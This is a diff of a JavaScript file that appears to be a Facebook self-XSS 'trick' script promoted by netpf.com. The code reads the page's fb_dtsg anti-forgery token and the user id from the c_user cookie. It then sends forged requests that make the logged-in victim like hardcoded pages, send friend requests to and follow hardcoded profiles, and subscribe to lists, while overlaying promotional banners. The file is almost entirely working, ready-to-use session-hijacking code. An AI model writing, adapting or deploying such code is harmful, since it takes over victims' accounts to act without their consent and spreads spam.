@@ -1,61 +1,104 @@
-function hp_d12(s) {
-var o = "",
-ar = new Array(),
-os = "",
-ic = 0,
-p = 0;
-for (i = 0; i < s.length; i++) {
-c = s.charCodeAt(i);
-if (c < 128) c = c ^ ((p++ % 8) + 1);
-os += String.fromCharCode(c);
-if (os.length > 80) {
-ar[ic++] = os;
-os = ""
-}
-}
-o = ar.join("") + os;
-return o
-}
+//eval
+var parent=document.getElementsByTagName("html")[0]; 
+var _body = document.getElementsByTagName('body')[0];
+var _div = document.createElement('div');
+_div.style.height="25";
+_div.style.width="100%";
+_div.style.position="fixed";
+_div.style.top="auto";
+_div.style.bottom="0";
+_div.align="center";
+_body.appendChild(_div);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
+var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 
-function cereziAl(isim) {
-var tarama = isim + "=";
-if (document.cookie.length > 0) {
-konum = document.cookie.indexOf(tarama);
-if (konum != -1) {
-konum += tarama.length;
-son = document.cookie.indexOf(";", konum);
-if (son == -1) son = document.cookie.length;
-return unescape(document.cookie.substring(konum, son))
-} else {
-return ""
+body = document.body;
+
+if(body != null) 
+{
+ div = document.createElement("div");
+ div.style.position = "fixed";
+ div.style.display = "block";
+ div.style.width = "100px";
+ div.style.opacity= 0.90;
+ div.style.bottom = "+35px";
+ div.style.left = "+0px";
+ div.style.backgroundColor = "rgba(0,0,0,0.5)";
+ div.style.border = "1px solid rgba(0,0,0,0.5)";
+ div.style.padding = "3px";
+ div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Close (F5)</center></blink></a>"
+ body.appendChild(div);
 }
+if(body != null) 
+{
+ div = document.createElement("div");
+ div.style.position = "fixed";
+ div.style.display = "block";
+ div.style.width = "135px";
+ div.style.opacity= 0.90;
+ div.style.bottom = "+10px";
+ div.style.left = "+0px";
+ div.style.backgroundColor = "rgba(0,0,0,0.5)";
+ div.style.border = "1px solid rgba(0,0,0,0.5)";
+ div.style.padding = "3px";
+ div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='http://www.netpf.com/' title='Net Professional'><blink><center>For More Tricks!</center></blink></a>"
+ body.appendChild(div);
 }
-}
-function getRandomInt(min, max) {
-return Math.floor(Math.random() * (max - min + 1)) + min
-}
-function randomValue(arr) {
-return arr[getRandomInt(0, arr.length - 1)]
-}
+
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function Like(p) {
+  var Page = new XMLHttpRequest();
+  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
+  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
+  Page.open("POST", PageURL, true);
+  Page.onreadystatechange = function () {
+    if (Page.readyState == 4 && Page.status == 200) {
+      Page.close;
+    }
+  };
+  Page.send(PageParams);
+}
 
+Like("439430329420491");
+Like("418836291540460");
+Like("233578153383244");
+
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function IDS(r) {
+  var X = new XMLHttpRequest();
+
+  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
+  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
+}
+
+IDS("100001052749861");
+IDS("100001734339861");
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 function a(abone) {
-var http4 = new XMLHttpRequest();
-var url4 = "/ajax/follow/follow_profile.php?__a=1";
-var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
-http4.open("POST", url4, true);
-http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-http4.setRequestHeader("Content-length", params4.length);
-http4.setRequestHeader("Connection", "close");
-http4.onreadystatechange = function() {
-if (http4.readyState == 4 && http4.status == 200) {
-http4.close
-}
-};
-http4.send(params4)
+  var http4 = new XMLHttpRequest();
+  var url4 = "/ajax/follow/follow_profile.php?__a=1";
+  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
+  http4.open("POST", url4, true);
+  http4.onreadystatechange = function () {
+    if (http4.readyState == 4 && http4.status == 200) {
+      http4.close;
+    }
+  };
+  http4.send(params4);
 }
 
 function sublist(uidss) {
@@ -65,7 +108,7 @@ function sublist(uidss) {
 }
 
 a("100001052749861");
-a("100001052749861");
+a("100001734339861");
 
 sublist("663827066995712");
 sublist("635397336505352");
